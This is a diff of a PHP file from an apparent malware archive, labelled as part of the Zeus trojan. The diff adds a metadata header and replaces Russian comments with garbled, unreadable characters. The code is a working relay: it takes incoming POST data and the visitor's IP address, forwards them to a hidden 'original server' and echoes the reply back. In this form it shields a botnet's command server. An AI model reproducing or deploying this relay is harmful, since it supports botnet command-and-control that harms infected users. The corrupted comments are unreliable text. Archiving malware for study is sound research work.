@@ -1,18 +1,29 @@
+/*
+  name      Zeus
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 <?php
-//URL оригинального сервера.
+//URL пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 $url = "http://localhost/s.php";
 
 @error_reporting(0); @set_time_limit(0);
 
-//Коннектимся к оригинальному серверу.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 $url = @parse_url($url);
 if(!isset($url['port']))$url['port'] = 80; 
 if(($real_server = @fsockopen($url['host'], $url['port'])) === false)die('E1');
 
-//Получаем данные для пересылки.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 if(($data = @file_get_contents('php://input')) === false)$data = '';
 
-//Формируем запрос.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 $request  = "POST {$url['path']}?ip=".urlencode($_SERVER['REMOTE_ADDR'])." HTTP/1.1\r\n";
 $request .= "Host: {$url['host']}\r\n";
 
@@ -22,14 +33,14 @@ if(!empty($_SERVER['HTTP_USER_AGENT']))$request .= "User-Agent: {$_SERVER['HTTP_
 $request .= "Content-Length: ".strlen($data)."\r\n";
 $request .= "Connection: Close\r\n";
 
-//Отправляем.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 fwrite($real_server, $request."\r\n".$data);
 
-//Получаем ответ.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 $result = '';
 while(!feof($real_server))$result .= fread($real_server, 1024);
 fclose($real_server);
 
-//Выводим ответ.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 echo substr($result, strpos($result, "\r\n\r\n") + 4);
 ?>
